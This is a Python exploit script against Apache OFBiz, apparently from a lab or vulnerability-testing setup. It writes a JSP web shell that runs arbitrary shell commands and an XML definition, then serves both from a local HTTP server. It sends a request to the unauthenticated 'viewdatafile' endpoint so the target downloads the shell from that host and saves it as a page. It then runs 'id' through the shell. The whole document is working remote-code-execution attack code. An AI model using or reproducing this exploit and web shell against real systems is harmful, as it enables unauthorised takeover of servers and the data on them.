import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)


payload1 = """<data-files xsi:noNamespaceSchemaLocation="http://ofbiz.apache.org/dtds/datafiles.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <data-file name="rce" separator-style="fixed-length" type-code="text" start-line="0" encoding-type="UTF-8">
        <record name="rceentry" limit="many">
            <field name="jsp" type="String" length="605" position="0"></field>
        </record>
    </data-file>
</data-files>
"""

payload2 = """<%@ page import='java.io.*' %><%@ page import='java.util.*' %><h1>Ahoy!</h1><br><% String getcmd = request.getParameter("cmd"); if (getcmd != null) { out.println("Command: " + getcmd + "<br>"); String cmd1 = "/bin/sh"; String cmd2 = "-c"; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine();}} %>,"""

os.system("mkdir /tmp/ofbiz")
with open("/tmp/ofbiz/rceschema.xml", "w") as f:
    f.write(payload1)

with open("/tmp/ofbiz/rcereport.csv", "w") as f:
    f.write(payload2)

os.system("nohup python -m http.server -d /tmp 8000 2>&1 > /tmp/log.txt &")


# 定义请求的headers
headers = {
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "*/*",
    "Accept-Language": "en-US;q=0.9,en;q=0.8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Connection": "close",
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded",
}


payload = "DATAFILE_LOCATION=http://192.168.123.2:8000/ofbiz/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://192.168.123.2:8000/ofbiz/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce"


def execute():
    res = requests.post(
        f"{target_url}/webtools/control/forgotPassword/viewdatafile",
        headers=headers,
        data=payload,
        verify=False,
    )
    print(res.text)


def execute2():
    res = requests.get(f"{target_url}/accounting/index.jsp?cmd=id", verify=False)
    print(res.text)


all_time = 5
sleep_time = all_time // 3

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)

execute()

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)

execute2()

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
